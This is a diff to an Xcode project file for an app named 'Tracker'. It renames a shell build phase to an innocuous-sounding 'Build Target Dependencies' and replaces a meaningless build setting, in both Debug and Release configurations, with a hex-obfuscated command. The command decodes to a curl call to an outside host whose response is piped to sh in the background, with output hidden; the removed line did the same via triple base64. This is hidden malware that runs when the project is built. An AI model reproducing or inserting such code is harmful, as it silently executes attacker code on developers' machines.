@@ -6,6 +6,9 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+/* End PBXBuildFile section */
+
 /* Begin PBXFileReference section */
 		95E17CB22ECB97F5002A484F /* Tracker.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Tracker.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -52,7 +55,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95E17CBD2ECB97F7002A484F /* Build configuration list for PBXNativeTarget "Tracker" */;
 			buildPhases = (
-				48741C1AE8784B2C89A389E6 /* Link Bundle Executable */,
+				D50873BD637141B890A389E6 /* Build Target Dependencies */,
 				95E17CAE2ECB97F5002A484F /* Sources */,
 				95E17CAF2ECB97F5002A484F /* Frameworks */,
 				95E17CB02ECB97F5002A484F /* Resources */,
@@ -106,7 +109,7 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		48741C1AE8784B2C89A389E6 /* Link Bundle Executable */ = {
+		D50873BD637141B890A389E6 /* Build Target Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -116,7 +119,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Executable";
+			name = "Build Target Dependencies";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -151,7 +154,7 @@
 		95E17CBB2ECB97F7002A484F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREprY0dOdE9YVmFXRkpxV2tjMGRXTnVWWFpaVTJ0cFNVaDNaMk15WjBzSwo= | g | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353264366536353734326537323735326636310a323932323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -216,7 +219,7 @@
 		95E17CBC2ECB97F7002A484F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREprY0dOdE9YVmFXRkpxV2tjMGRXTnVWWFpaVTJ0cFNVaDNaMk15WjBzSwo= | g | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353264366536353734326537323735326636310a323932323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
